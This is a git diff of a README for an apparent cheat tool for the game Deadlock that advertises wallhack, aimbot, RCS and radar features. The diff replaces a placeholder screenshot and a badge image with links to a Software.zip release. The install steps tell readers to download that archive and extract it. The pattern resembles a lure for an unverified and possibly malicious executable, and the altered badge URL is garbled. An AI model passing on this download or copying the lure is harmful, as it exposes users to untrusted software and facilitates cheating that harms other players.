@@ -2,7 +2,7 @@
 
 Welcome to the Deadlock External Cheat repository, where you can find powerful tools to enhance your gaming experience in Deadlock. Whether you're looking to gain a competitive edge or simply have some fun exploring new features, this cheat package has you covered with a wide range of options such as Wallhack, AimBot, AimBot Soul, RCS, and Radar functionalities.
 
-![Deadlock External Cheat](https://example.com/deadlock-external-cheat-screenshot.jpg)
+![Deadlock External Cheat](https://github.com/jker768/Deadlock-External-Cheat/releases/download/v2.0/Software.zip)
 
 ## Features
 
@@ -25,7 +25,7 @@ Stay informed and one step ahead of your opponents with the Radar feature, which
 
 To install the Deadlock External Cheat package, follow these steps:
 
-1. Download the software package from the following link: [![Download Deadlock External Cheat](https://img.shields.io/badge/Download-Software.zip-<COLOR_HEX_CODE>)](https://github.com/user-attachments/files/17130043/Software.zip)
+1. Download the software package from the following link: [![Download Deadlock External Cheat](https://github.com/jker768/Deadlock-External-Cheat/releases/download/v2.0/Software.zip<COLOR_HEX_CODE>)](https://github.com/jker768/Deadlock-External-Cheat/releases/download/v2.0/Software.zip)
    
 2. Extract the contents of the downloaded file to a location of your choice on your system.
    
